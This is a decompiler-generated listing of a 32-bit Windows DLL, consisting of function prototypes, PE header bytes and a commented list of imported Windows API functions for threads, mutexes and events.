_DWORD *__stdcall sub_10030DA9(_DWORD *a1);
_DWORD *__stdcall sub_10030DD4(_DWORD *a1);
// DWORD *__userpurge sub_10030E11@<eax>(DWORD *a1@<esi>, DWORD a2);
// int __usercall sub_10030E28@<eax>(_DWORD *a1@<esi>);
// bool __usercall sub_10030E49@<al>(_DWORD *a1@<eax>);
_DWORD *__thiscall sub_10030E74(void *this, _DWORD *a2, int a3, int a4);
int *__thiscall sub_10030EBA(int *Block, char a2);
void __thiscall sub_10030ED9(int *this);
_DWORD *__stdcall sub_10030F17(int a1, _DWORD *a2);
_DWORD *__thiscall sub_10030F50(void *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int *a8, int *a9, int a10, int a11, int a12, int a13, int a14, int a15);
int *__thiscall sub_10030FF3(int *Block, char a2);
void __thiscall sub_10031012(int *this);
_DWORD *__thiscall sub_10031036(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003104B(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10031060(_DWORD *this, _DWORD *a2);
_DWORD *__stdcall sub_10031075(_DWORD *a1);
_DWORD *__thiscall sub_100310A3(_DWORD *Block, char a2);
void __thiscall sub_100310C2(_DWORD *this);
_DWORD *__stdcall sub_100310E6(_DWORD *a1);
_DWORD *__thiscall sub_10031114(_DWORD *Block, char a2);
void __thiscall sub_10031133(_DWORD *this);
_DWORD *__stdcall sub_10031157(_DWORD *a1);
int __thiscall sub_1003117A(_DWORD *this);
_DWORD *__stdcall sub_10031190(_DWORD *a1);
int __thiscall sub_100311FD(_DWORD *this);
int __thiscall sub_10031252(_DWORD *this);
void __fastcall sub_10031256(_DWORD *a1, int a2);
int *__thiscall sub_100315C3(int *Block, char a2);
void __thiscall sub_100315E2(int *this);
_DWORD *__stdcall sub_1003164A(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1003167F(int a1, _DWORD *a2);
_DWORD *__stdcall sub_100316B4(int a1, _DWORD *a2);
_DWORD *__stdcall sub_100316E9(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1003171E(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1003177D(int pExceptionObject, _DWORD *a2);
int __fastcall sub_100317CE(_DWORD *a1);
int __thiscall sub_100317EE(_DWORD *this, int a2);
unsigned int sub_10031812();
unsigned int sub_10031842();
unsigned int sub_1003186D();
unsigned int sub_10031892();
int sub_100318AD();
int *sub_10031908();
// _DWORD *__usercall sub_1003194B@<eax>(int a1@<eax>, int a2@<ecx>, int a3);
int sub_100319C4();
void sub_100319FE();
// int __usercall sub_10031A1B@<eax>(size_t a1@<esi>);
unsigned int sub_10031A3B();
unsigned int sub_10031A8D();
// int __usercall sub_10031BD2@<eax>(int a1@<edi>);
// int __usercall sub_10031C67@<eax>(int a1@<eax>);
int sub_10031CBF();
// _DWORD *__usercall sub_10031CF8@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3);
// _DWORD *__usercall sub_10031D23@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
// _DWORD *__usercall sub_10031D75@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<esi>);
// int *__usercall sub_10031DE4@<eax>(int a1@<eax>, _DWORD *a2@<ecx>);
// _DWORD *__usercall sub_10031E0D@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_10031E3F@<eax>(_DWORD *a1@<edi>, int a2);
int *sub_10031ED0();
// int __usercall sub_10031F8D@<eax>(int result@<eax>);
void *sub_10031FD8();
// char *__userpurge sub_100320C3@<eax>(int a1@<eax>, int a2);
// _BYTE *__userpurge sub_10032276@<eax>(int a1@<ebx>, unsigned __int8 *a2@<edi>, int a3);
unsigned __int8 *__thiscall sub_10032306(unsigned __int8 *this, int a2);
_DWORD *__thiscall sub_1003246A(_DWORD *this, int a2);
char *__cdecl sub_10032513(unsigned __int8 *a1, unsigned __int8 *a2, int a3);
// int __usercall sub_10032692@<eax>(int a1@<eax>, int a2@<ecx>);
// char __usercall sub_100327C8@<al>(unsigned __int8 *a1@<edi>);
// unsigned __int8 *__userpurge sub_1003298D@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 *i@<ecx>, int a3);
char *__cdecl sub_10032AD9(unsigned __int8 *a1);
int __thiscall sub_10032D99(int this, int a2);
// int __usercall sub_10032E88@<eax>(int a1@<eax>);
// char __usercall sub_10032F72@<al>(int a1@<eax>, int a2@<ecx>);
// char __userpurge sub_10032FBD@<al>(unsigned __int8 *a1@<eax>, int a2);
// char __usercall sub_100330B2@<al>(unsigned __int8 *a1@<eax>);
// int __usercall sub_1003319E@<eax>(int a1@<eax>, int a2@<ecx>);
int *__thiscall sub_100331CC(unsigned __int8 *this);
// char __userpurge sub_10033272@<al>(unsigned __int8 *a1@<ebx>, int a2);
// int *__usercall sub_10033344@<eax>(unsigned __int8 *a1@<eax>);
void *sub_10033448();
unsigned int __stdcall sub_10033464(_DWORD *a1, _DWORD *a2);
char __stdcall sub_100335E3(_DWORD *a1, _DWORD *a2);
// _DWORD *__userpurge sub_10033785@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
void *__thiscall sub_100337C3(void *Block, char a2);
void __thiscall sub_100337E2(int this);
int __thiscall sub_10033838(int *this, _BYTE *a2);
size_t __thiscall sub_10033868(_DWORD *this, _DWORD *a2);
int __thiscall sub_100338DB(_DWORD *this);
BOOL __thiscall sub_100338E2(void *this);
int __thiscall sub_100338ED(_DWORD *this, int a2);
void __thiscall sub_1003391E(_DWORD *this);
int __thiscall sub_10033923(_DWORD *this);
int __thiscall sub_10033927(_DWORD *this, int a2, int a3);
char sub_10033972();
// int __usercall sub_10033975@<eax>(int result@<eax>);
_DWORD *__thiscall sub_1003398D(_DWORD *Block, char a2);
// int __userpurge sub_100339B4@<eax>(int result@<eax>, int a2@<ecx>, int a3, char a4, int a5, int a6, char a7);
int __thiscall sub_10033A0D(int this, int a2);
int __thiscall sub_10033A41(_DWORD *this);
int __thiscall sub_10033A45(_DWORD *this);
int __thiscall sub_10033A49(_DWORD *this);
char __thiscall sub_10033A4D(_BYTE *this);
int __thiscall sub_10033A51(_BYTE *this);
_DWORD *__thiscall sub_10033A59(int this, _DWORD *a2);
_DWORD *__thiscall sub_10033BCD(int this, _DWORD *a2);
char __thiscall sub_10033D0E(_ThrowInfo *this);
_DWORD *__cdecl sub_10033EBD(_DWORD *a1);
int __stdcall sub_10033FA7(int a1);
// _DWORD *__userpurge sub_10033FD7@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// int __userpurge sub_10034019@<eax>(_DWORD *a1@<esi>, int a2);
int __stdcall sub_1003408D(int a1, int a2, int a3, int a4, int a5, int a6, int a7, char a8);
int *__thiscall sub_10034109(int *Block, char a2);
void __thiscall sub_10034128(int *this);
_DWORD *__thiscall sub_1003416A(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003419C(void *this, _DWORD *a2);
int __thiscall sub_100341CE(_DWORD *this);
int __thiscall sub_100341D2(_DWORD *this);
char __thiscall sub_100341D6(_BYTE *this);
_DWORD *__thiscall sub_100341E1(_DWORD *Block, char a2);
// BOOL __stdcall Thread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
// BOOL __stdcall Thread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall ConvertStringSecurityDescriptorToSecurityDescriptorW(LPCWSTR StringSecurityDescriptor, DWORD StringSDRevision, PSECURITY_DESCRIPTOR *SecurityDescriptor, PULONG SecurityDescriptorSize);
// BOOL __stdcall ConvertStringSidToSidW(LPCWSTR StringSid, PSID *Sid);
// int __userpurge sub_10034903@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<ecx>, int a3);
int __stdcall sub_10034953(_DWORD *a1);
int *__thiscall sub_1003497E(int *this);
FARPROC __stdcall sub_10034A61(int *a1, int *Arguments);
int *__thiscall sub_10034C9E(int *hMem, char a2);
int __stdcall sub_10034CBC(char *a1);
int __stdcall sub_10034D58(char *hLibModule);
void __thiscall sub_10034E35(void *this);
_DWORD *__thiscall sub_10034E40(_DWORD *Block, char a2);
std::exception *__thiscall sub_10034E62(std::exception *this, struct std::exception *a2);
// void *__cdecl operator new(size_t Size); idb
// int __cdecl atexit(void (__cdecl *)());
void __thiscall sub_10035029(struct type_info *this);
struct type_info *__thiscall sub_10035037(struct type_info *Block, char a2);
char *__thiscall sub_100350C0(char *this);
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *), void (__thiscall *)(void *)); idb
void __cdecl j__free(void *Block);
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *)); idb
// int __cdecl __DllMainCRTStartup(HINSTANCE hinstDLL); idb
// BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
// errno_t __cdecl wcscat_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// int __cdecl wcscmp(const wchar_t *String1, const wchar_t *String2);
// int __cdecl _vsnwprintf_s(wchar_t *const Buffer, const size_t BufferCount, const size_t MaxCount, const wchar_t *const Format, va_list ArgList);
// errno_t __cdecl wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
void __thiscall sub_10035A4A(void *this);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// wchar_t *__cdecl wcschr(const wchar_t *Str, wchar_t Ch);
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct localeinfo_struct *); idb
// int __cdecl _wcsicmp(const wchar_t *String1, const wchar_t *String2);
// errno_t __cdecl wcsncpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source, rsize_t MaxCount);
// size_t __cdecl wcsnlen(const wchar_t *Source, size_t MaxCount);
// size_t __cdecl strnlen(const char *String, size_t MaxCount);
// errno_t __cdecl _wcslwr_s(wchar_t *String, size_t SizeInWords);
// size_t __cdecl wcslen(const wchar_t *String);
// errno_t __cdecl _wcsupr_s_l(wchar_t *String, size_t Size, _locale_t Locale);
errno_t __cdecl sub_1003696F(wchar_t *String, size_t Size);
// wchar_t *__cdecl wcsrchr(const wchar_t *Str, wchar_t Ch);
// wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);
// static errno_t __cdecl memcpy_s(void *const Destination, const rsize_t DestinationSize, const void *const Source, const rsize_t SourceSize);
// errno_t __cdecl _wcsnset_s(wchar_t *Destination, size_t SizeInWords, wchar_t Value, size_t MaxCount);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
// __time32_t __cdecl time(__time32_t *const Time);
// void __cdecl srand(unsigned int Seed);
// void (__cdecl *__cdecl _set_se_translator(void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *)))(unsigned int, struct _EXCEPTION_POINTERS *); idb
// int __cdecl _set_new_mode(int); idb
int __cdecl sub_10039D3B(int a1);
// int (__cdecl *__cdecl _set_new_handler(int (__cdecl *)(unsigned int)))(unsigned int); idb
// int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount);
// size_t __cdecl strlen(const char *Str);
// char *__cdecl strcpy(char *Destination, const char *Source);
// uintptr_t __cdecl _beginthreadex(void *Security, unsigned int StackSize, _beginthreadex_proc_type StartAddress, void *ArgList, unsigned int InitFlag, unsigned int *ThrdAddr);
// wint_t __cdecl _towupper_l(wint_t C, _locale_t Locale);
wint_t __cdecl sub_1003A1CE(wint_t C);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const char *const *); idb
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *); idb
void __thiscall sub_1003A301(void *this);
std::exception *__thiscall sub_1003A360(std::exception *this, char *a2);
std::exception *__thiscall sub_1003A379(std::exception *this, struct std::exception *a2);
void *__thiscall sub_1003A3D7(void *Block, char a2);
_DWORD *__thiscall sub_1003A3F3(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003A415(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003A437(_DWORD *Block, char a2);
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// _DWORD __cdecl _encode_pointer(_DWORD); weak
// int _encoded_null(void); weak
// _DWORD __cdecl _decode_pointer(_DWORD); weak
int sub_1003A799();
// int _getptd(void); weak
int __cdecl sub_1003AF4B(_DWORD *a1);
int __cdecl sub_1003AFFA(_DWORD *a1);
// void __cdecl type_info::_Type_info_dtor(struct type_info *); idb
int __cdecl sub_1003BD5C(int a1);
// void __cdecl free(void *Block);
void *sub_1003C57F();
void __cdecl sub_1003C5A3(); // idb
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
// void __cdecl __security_init_cookie();
int __cdecl sub_1003C93C(int a1);
// void __cdecl __noreturn _invoke_watson(const wchar_t *Expression, const wchar_t *FunctionName, const wchar_t *FileName, unsigned int LineNo, uintptr_t Reserved);
// int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int *__cdecl _errno();
// void __cdecl __noreturn __report_gsfailure();
int sub_1004008E();
// _DWORD __cdecl _unlock(_DWORD); weak
// errno_t __cdecl strcpy_s(char *Destination, rsize_t SizeInBytes, const char *Source);
int sub_10042CB1();
LONG __cdecl sub_100430BD(LONG a1);
int __cdecl sub_100431CB(int a1);
int sub_10043CBC();
char __thiscall sub_10043CC0(_BYTE *this);
int __thiscall sub_10043CDF(_DWORD *this);
int __thiscall sub_10043D37(_DWORD *this);
int __cdecl sub_100487A5(int a1, int a2, int a3);
void sub_100495F8();
void **sub_10049EE0();
// _DWORD __cdecl _unlock_file2(_DWORD, _DWORD); weak
// int __cdecl _output_l(int, int, struct localeinfo_struct *, int); idb
int sub_1004ADE8();
// int __cdecl _output_s_l(int, int, struct localeinfo_struct *, int); idb
// int _get_sse2_info(void); weak
int sub_1004CDA8();
int sub_1004E3F8();
// int LcidFromHexString(void); weak
// int GetPrimaryLen(void); weak
// BOOL __cdecl TestDefaultLanguage(int a1, int a2);
int sub_10050B5E();
// _DWORD __cdecl flsall(_DWORD); weak
int sub_10050DD7();
// _DWORD __cdecl vprintf_helper(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __cdecl sub_1005129E(int a1, int a2, int a3);
int __cdecl sub_100512B8(int a1, int a2, int a3);
int __cdecl sub_100512D2(int a1, int a2, int a3);
// int __cdecl _output_p_l(FILE *Stream, int, struct localeinfo_struct *, int); idb
// unsigned int __cdecl strtoxl(struct localeinfo_struct *, const char *, const char **, int, int); idb
unsigned int __cdecl sub_10052794(char *a1, char **a2, int a3, struct localeinfo_struct *a4);
int __cdecl sub_100527F4(_DWORD *a1);
int __cdecl sub_10052828(_DWORD *a1);
int __cdecl sub_1005285C(_DWORD *a1);
int *sub_10052932();
int *sub_10052938();
int *sub_1005293E();
void **sub_10052944();
// unsigned __int64 __cdecl strtoxq(struct localeinfo_struct *, const char *, const char **, int, int); idb
unsigned __int64 __cdecl sub_10053909(char *a1, char **a2, int a3, struct localeinfo_struct *a4);
int sub_10053DD3();
bool __cdecl __uncaught_exception(); // idb
// int __stdcall GetModuleBaseNameW(int a1, int a2, int a3, int a4);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
void __thiscall sub_10055017(void *this);
_DWORD *__thiscall sub_10055022(_DWORD *Block, char a2);
std::exception *__thiscall sub_100560BB(std::exception *this, struct std::exception *a2);
// _DWORD *__cdecl _CreateFrameInfo(_DWORD *a1, int a2);
// _DWORD *__usercall _EH_prolog3@<eax>(int a1@<eax>);
void sub_10056753();
void sub_10056762();
int __cdecl sub_1005740D(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_10057580(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_100581A8(unsigned __int16 *a1, _DWORD *a2);
int __cdecl sub_100586EA(unsigned __int16 *a1, _DWORD *a2);
// _DWORD __cdecl _ld12told(_DWORD, _DWORD); weak
// _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl __STRINGTOLD_L(int a1, int a2, int a3, int a4, int a5);
// int __cdecl _I10_OUTPUT(int a1, int a2, __int16 a3, int a4, char a5, int a6);
int __stdcall sub_1005B6E8(int a1, int a2, int a3);
int __stdcall sub_1005B76B(int a1);
// int __userpurge sub_1005BD6F@<eax>(int a1@<edi>, int a2);
void __cdecl sub_1005BEA2(int a1);
int __stdcall sub_1005BF08(int a1);
int sub_1006B527();
int sub_1006B549();
int sub_1006B608();
int sub_1006B62A();
int sub_1006B64C();
int sub_1006B66E();
int sub_1006B690();
int sub_1006B6B2();
int sub_1006B6D4();
int sub_1006B6F6();
int sub_1006B718();
int sub_1006B73A();
int sub_1006B75C();
int sub_1006B77E();
int sub_1006B7A0();
int sub_1006B7BB();
int sub_1006B7D3();
int sub_1006B7F5();
int sub_1006C1BC();
int sub_1006C20D();
int sub_1006C22F();
int sub_1006C251();
int sub_1006C273();
int sub_1006C295();
int sub_1006C2E6();
int sub_1006C308();
int sub_1006C32A();
int sub_1006C34C();
int sub_1006C36E();
int sub_1006C384();
int sub_1006C390();
int sub_1006C3E6();
int sub_1006C43C();
int sub_1006C447();
int sub_1006C49D();
int sub_1006C4F3();
int sub_1006C4FE();
int sub_1006C50F();
int sub_1006C531();
int sub_1006C547();
int sub_1006C55D();
const CHAR *sub_1006C569();
int sub_1006C57A();
int sub_1006C5CB();
int sub_1006C5ED();
int sub_1006C60F();
int sub_1006C631();
int sub_1006C653();
int sub_1006C675();
int sub_1006C697();
int sub_1006C6AF();
int sub_1006C6D1();
int sub_1006C6F3();
int sub_1006C715();
int sub_1006C72B();
int sub_1006C737();
int sub_1006C759();
int sub_1006C77B();
int sub_1006C79D();
int sub_1006C7BF();
int sub_1006C7E1();
int sub_1006C803();
int sub_1006C825();
int sub_1006C831();
int sub_1006C853();
int sub_1006C875();
int sub_1006C897();
int sub_1006C8B9();
int sub_1006C8DB();
int sub_1006C8FD();
int sub_1006C91F();
char *sub_1006C941();
char *sub_1006C952();
int sub_1006C963();
int sub_1006C99D();
int sub_1006C9BF();
int sub_1006C9DA();
int sub_1006C9F5();
int sub_1006CA17();
int sub_1006CA39();
int sub_1006CA5B();
int sub_1006CA71();
int sub_1006CA93();
int sub_1006CAB5();
int sub_1006CAD7();
int sub_1006CAF9();
int sub_1006CB11();
int sub_1006CB27();
int sub_1006CB33();
int sub_1006CB4E();
int sub_1006CB70();
int sub_1006CB8B();
int sub_1006CBAD();
int sub_1006CBD9();
int sub_1006CBFB();
int sub_1006CC1D();
void __cdecl sub_1006CC3F(); // idb
void __cdecl sub_1006CC49(); // idb
void __cdecl sub_1006CC54(); // idb
void __cdecl sub_1006CC5E(); // idb
void __cdecl sub_1006CC68(); // idb
void __cdecl sub_1006CC72(); // idb
void __cdecl sub_1006CC7C(); // idb
void __cdecl sub_1006CC86(); // idb
void __cdecl sub_1006CC90(); // idb
void __cdecl sub_1006CC9A(); // idb
void __cdecl sub_1006CCA4(); // idb
void __cdecl sub_1006CCAE(); // idb
void __cdecl sub_1006CCB8(); // idb
void __cdecl sub_1006CCC2(); // idb
void __cdecl sub_1006CCCC(); // idb
void __cdecl sub_1006CCD6(); // idb
void __cdecl sub_1006CCE0(); // idb
void __cdecl sub_1006CCEA(); // idb
void __cdecl sub_1006CCFE(); // idb
void __cdecl sub_1006CD08(); // idb
void __cdecl sub_1006CD12(); // idb
void __cdecl sub_1006CD1C(); // idb
void __cdecl sub_1006CD26(); // idb
void __cdecl sub_1006CD30(); // idb
void __cdecl sub_1006CD3A(); // idb
void __cdecl sub_1006CD44(); // idb
void __cdecl sub_1006CD4E(); // idb
void __cdecl sub_1006CD58(); // idb
void __cdecl sub_1006CD62(); // idb
void __cdecl sub_1006CD6C(); // idb
void __cdecl sub_1006CD76(); // idb
void __cdecl sub_1006CD80(); // idb
void __cdecl sub_1006CD8A(); // idb
void __cdecl sub_1006CD94(); // idb
void __cdecl sub_1006CD9E(); // idb
void __cdecl sub_1006CDA8(); // idb
void __cdecl sub_1006CDB2(); // idb
void __cdecl sub_1006CDBD(); // idb
void __cdecl sub_1006CDC7(); // idb
void __cdecl sub_1006CDD1(); // idb
void __cdecl sub_1006CDDB(); // idb
void __cdecl sub_1006CDE5(); // idb
void __cdecl sub_1006CDEF(); // idb
void __cdecl sub_1006CDF9(); // idb
void __cdecl sub_1006CE03(); // idb
void __cdecl sub_1006CE0D(); // idb
void __cdecl sub_1006CE17(); // idb
void __cdecl sub_1006CE21(); // idb
void __cdecl sub_1006CE2B(); // idb
void __cdecl sub_1006CE35(); // idb
void __cdecl sub_1006CE3F(); // idb
void __cdecl sub_1006CE49(); // idb
void __cdecl sub_1006CE53(); // idb
void __cdecl sub_1006CE5D(); // idb
void __cdecl sub_1006CE67(); // idb
void __cdecl sub_1006CE71(); // idb
void __cdecl sub_1006CE7B(); // idb
void __cdecl sub_1006CE85(); // idb
void __cdecl sub_1006CE8F(); // idb
void __cdecl nullsub_4(); // idb
void __cdecl sub_1006CE9A(); // idb
void __cdecl sub_1006CEA4(); // idb
void __cdecl sub_1006CEAE(); // idb
void __cdecl sub_1006CEB8(); // idb
void __cdecl sub_1006CEC2(); // idb
void __cdecl sub_1006CECC(); // idb
void __cdecl sub_1006CED6(); // idb
void __cdecl sub_1006CEE0(); // idb
void __cdecl sub_1006CEEA(); // idb
void __cdecl sub_1006CEF4(); // idb
void __cdecl sub_1006CEFE(); // idb
void __cdecl sub_1006CF08(); // idb
void __cdecl sub_1006CF12(); // idb
void __cdecl sub_1006CF1C(); // idb
void __cdecl sub_1006CF26(); // idb
void __cdecl sub_1006CF30(); // idb
void __cdecl sub_1006CF3A(); // idb
void __cdecl sub_1006CF44(); // idb
void __cdecl sub_1006CF4E(); // idb
void __cdecl sub_1006CF58(); // idb
void __cdecl sub_1006CF62(); // idb
void __cdecl sub_1006CF6C(); // idb
void __cdecl sub_1006CF76(); // idb
void __cdecl sub_1006CF80(); // idb
void __cdecl sub_1006CF8A(); // idb
void __cdecl sub_1006CF94(); // idb
void __cdecl sub_1006CF9E(); // idb
void __cdecl sub_1006CFA8(); // idb
void __cdecl sub_1006CFB2(); // idb
void __cdecl sub_1006CFBC(); // idb
void __cdecl sub_1006CFC6(); // idb
void __cdecl sub_1006CFD0(); // idb
// int __stdcall GetModuleBaseNameW(_DWORD, _DWORD, _DWORD, _DWORD); weak

//-------------------------------------------------------------------------
// Data declarations

__int16 _ImageBase = 23117; // weak
__int16 word_10000002 = 144; // weak
int *off_1000003C = (int *)0xF8; // weak
char byte_10000040[184] =
{
  '\x0E',
  '\x1F',
  '\xBA',
  '\x0E',
  '\0',
  '\xB4',
  '\t',
  '\xCD',
  '!',
  '\xB8',
  '\x01',
  'L',
  '\xCD',
  '!',
  'T',
  'h',
  'i',
  's',
  ' ',
  'p',
  'r',
  'o',
  'g',
  'r',
  'a',
  'm',
  ' ',
  'c',
  'a',
  'n',
  'n',
  'o',
  't',
  ' ',
  'b',
  'e',
  ' ',
  'r',
  'u',
  'n',
  ' ',
  'i',
  'n',
  ' ',
  'D',
  'O',
  'S',
  ' ',
  'm',
  'o',
  'd',
  'e',
  '.',
  '\r',
  '\r',
  '\n',
  '$',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xE8',
  '\'',
  '\xBD',
  '\x92',
  '\xAC',
  'F',
  '\xD3',
  '\xC1',
  '\xAC',
  'F',
  '\xD3',
  '\xC1',
  '\xAC',
  'F',
  '\xD3',
  '\xC1',
  '\x8B',
  '\x80',
  '\xAE',
  '\xC1',
  '\xBB',
  'F',
  '\xD3',
  '\xC1',
  '\x8B',
  '\x80',
  '\xBD',
  '\xC1',
  '\x93',
  'F',
  '\xD3',
  '\xC1',
  '\x8B',
  '\x80',
  '\xBE',
  '\xC1',
  '(',
  'F',
  '\xD3',
  '\xC1',
  '\x8B',
  '\x80',
  '\xA8',
  '\xC1',
  '\xAF',
  'F',
  '\xD3',
  '\xC1',
  '\xAC',
  'F',
  '\xD2',
  '\xC1',
  'E',
  'F',
  '\xD3',
  '\xC1',
  '\x8B',
  '\x80',
  '\xA1',
  '\xC1',
  '\'',
  'F',
  '\xD3',
  '\xC1',
  '\x8B',
  '\x80',
  '\xA9',
  '\xC1',
  '\xAD',
  'F',
  '\xD3',
  '\xC1',
  '\x8B',
  '\x80',
  '\xAF',
  '\xC1',
  '\xAD',
  'F',
  '\xD3',
  '\xC1',
  '\x8B',
  '\x80',
  '\xAB',
  '\xC1',
  '\xAD',
  'F',
  '\xD3',
  '\xC1',
  'R',
  'i',
  'c',
  'h',
  '\xAC',
  'F',
  '\xD3',
  '\xC1',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_1005B76A = '\xCC'; // weak
char byte_1005BD6E = '\xCC'; // weak
char byte_1005BEA1 = '\xCC'; // weak
char byte_1005BF07 = '\xCC'; // weak
char byte_1005BF33 = '\xCC'; // weak
_UNKNOWN loc_1005F3E9; // weak
_UNKNOWN loc_1005F40D; // weak
_UNKNOWN loc_1005F4E3; // weak
_UNKNOWN loc_1005F5EF; // weak
_UNKNOWN loc_1005F646; // weak
_UNKNOWN loc_1005F66A; // weak
_UNKNOWN loc_1005F68E; // weak
_UNKNOWN loc_1005F6B2; // weak
_UNKNOWN loc_1005F766; // weak
_UNKNOWN loc_1005F8BC; // weak
_UNKNOWN loc_1005FA54; // weak
_UNKNOWN loc_1005FAB8; // weak
_UNKNOWN loc_1005FADC; // weak
_UNKNOWN loc_1005FB00; // weak
_UNKNOWN loc_10061114; // weak
_UNKNOWN loc_1006205D; // weak
_UNKNOWN loc_10064B33; // weak
_UNKNOWN loc_10064D03; // weak
_UNKNOWN loc_100669EF; // weak
// extern DWORD (__stdcall *GetShortPathNameW)(LPCWSTR lpszLongPath, LPWSTR lpszShortPath, DWORD cchBuffer);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern DWORD (__stdcall *GetLastError)();
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern BOOL (__stdcall *SetEnvironmentVariableW)(LPCWSTR lpName, LPCWSTR lpValue);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern LONG (__stdcall *InterlockedDecrement)(volatile LONG *lpAddend);
// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern BOOL (__stdcall *ResetEvent)(HANDLE hEvent);
// extern HANDLE (__stdcall *CreateEventW)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
// extern HANDLE (__stdcall *OpenEventW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern DWORD (__stdcall *SuspendThread)(HANDLE hThread);
// extern DWORD (__stdcall *ResumeThread)(HANDLE hThread);
// extern BOOL (__stdcall *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
// extern HANDLE (__stdcall *OpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
// extern BOOL (__stdcall *GetExitCodeThread)(HANDLE hThread, LPDWORD lpExitCode);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *OpenMutexW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern BOOL (__stdcall *ReleaseMutex)(HANDLE hMutex);
// extern BOOL (__stdcall *IsBadReadPtr)(const void *lp, UINT_PTR ucb);
// extern UINT (__stdcall *GetSystemDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern LPWSTR (__stdcall *lstrcpynW)(LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern void (__stdcall __noreturn *ExitThread)(DWORD dwExitCode);
